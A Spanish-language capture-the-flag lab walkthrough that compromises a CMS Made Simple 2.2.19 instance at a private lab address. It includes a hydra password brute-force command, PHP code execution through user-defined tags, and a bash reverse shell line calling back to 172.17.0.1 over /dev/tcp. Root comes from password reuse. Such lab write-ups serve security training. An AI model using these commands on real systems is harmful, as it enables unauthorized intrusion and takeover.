Empezamos la maquina Dificil

![image](https://github.com/user-attachments/assets/71b619b0-2b37-412e-83a7-83b78f38fe80)

nmap: 22,80

---
entramos a la pagina principal y no hay mucho

![image](https://github.com/user-attachments/assets/e7c0645d-1ef4-4150-94ae-581a881de90a)

 nos vamos al código fuente y dice al final:
 
![image](https://github.com/user-attachments/assets/4e554fc6-666b-408a-8609-1b41c78ea9a7)

entramos:
> http://172.17.0.2/cmsms/
> 
![image](https://github.com/user-attachments/assets/e690e84e-f33d-4b2a-9c3c-53e1b49b5e6c)

buscando y haciendo Fuerza bruta de directorios, no encontraba mucho, pero me entro la curiosidad por esto:

![image](https://github.com/user-attachments/assets/77cc8607-d8e3-4ae9-b77f-5e8c4a8833a5)

Esta en PHP así que probablemente tiene un "login.php" y al final di con esto
> http://172.17.0.2/cmsms/admin/login.php

![image](https://github.com/user-attachments/assets/6b2308bf-3725-4455-b601-cbfa0091862f)

que nos lleva al login

si capturo con burpsuite el login que ya tiene por defecto un usuario y contraseña que dicen que es incorrecto, da esto:
> username=admin&password=christelle&loginsubmit=Submit

![image](https://github.com/user-attachments/assets/7d840e91-62f4-4ccd-ae4e-0d7931073828)

Que realmente no nos dice mucho. 

hacemos un ataque de fuerza bruta:

    - hydra -l admin -P /usr/share/wordlists/rockyou.txt  "http-post-form://172.17.0.2/cmsms/admin/login.php:username=^USER^&password=^PASS^&loginsubmit=Submit:User name or password incorrect"  

![image](https://github.com/user-attachments/assets/6d2f3c8e-5ace-4a65-a55d-efcfe4078650)


y nos da la contraseña "chocolate" para admin
probamos en el panel de login

![image](https://github.com/user-attachments/assets/386e9cb0-5a71-4b1d-812d-dc6a0972ad2f)

ya estamos dentro el panel, vemos una versión antigua entonces buscamos las vulnerabilidades conocidas para la versión 2.2.19 de CMS Made Simple. las cuales encontré con esta explicación 

> |[CVE-2024-27625](https://translate.google.com/website?sl=en&tl=es&hl=es&client=srp&u=https://www.cve.org/CVERecord?id%3DCVE-2024-27625)|La versión 2.2.19 de CMS Made Simple es vulnerable a ataques de secuencias de comandos entre sitios (XSS). Esta vulnerabilidad reside en el módulo Administrador de archivos del panel de administración. En concreto, el problema surge debido a una limpieza inadecuada de la entrada del usuario en el campo "Nuevo directorio".|
  [CVE-2024-27623](https://translate.google.com/website?sl=en&tl=es&hl=es&client=srp&u=https://www.cve.org/CVERecord?id%3DCVE-2024-27623)|La versión 2.2.19 de CMS Made Simple es vulnerable a la inyección de plantillas del lado del servidor (SSTI). La vulnerabilidad existe en el Administrador de diseño, en particular al editar las rutas de navegación.|

aquí la pagina de la explicación sobre la vulnerabilidad: https://cve-mitre-org.translate.goog/cgi-bin/cvekey.cgi?keyword=cms+made+simple&_x_tr_sl=en&_x_tr_tl=es&_x_tr_hl=es&_x_tr_pto=tc


nos vamos a: 
> extensiones > user defined tags > add defined tags > le colocamos un nombre y pruebo su vulnerabilidad 

![image](https://github.com/user-attachments/assets/002a7c04-f680-4f37-b1f4-3b5d3a345efe)


en code colocamos:

    - <?php echo system('id'); ?>

veremos que queda guardado y entramos al "prueba" que creamos:

guardamos y colocamos "run" nos mostrara este mensaje:

![image](https://github.com/user-attachments/assets/cb6c9261-d0ae-4ffb-b8ba-2aeeda6aa241)


probamos si la vulnerabilidad que encontramos esta funcionando:

![image](https://github.com/user-attachments/assets/2a61ceba-4310-4ae6-9f0d-09858b14c83a)

nos dará: 

>uid=33(www-data) gid=33(www-data) groups=33(www-data) uid=33(www-data) gid=33(www-data) groups=33(www-data)

o sea que la vulnerabilidad esta funcionando

entonces modificamos ese código dentro del paréntesis y colocamos así la reverse shell con nuestro terminal en escucha:

     - <?php echo system('bash -c "bash -i >& /dev/tcp/172.17.0.1/443 0>&1"'); ?>

![image](https://github.com/user-attachments/assets/dd901b2f-9972-4bb1-bc5c-1c9021d462c7)


entonces la lanzamos con el terminal en escucha y entramos.

![image](https://github.com/user-attachments/assets/e5f24e05-b124-4411-b877-6f4f132bdf00)

dentro no encontré nada y probé con la misma contraseña de admin del panel por curiosidad con el usuario  admin
ingresamos la contraseña "chocolate" al su root

![image](https://github.com/user-attachments/assets/01a572c6-ed60-483e-82a1-7e2637c3dc78)

y somos root! 


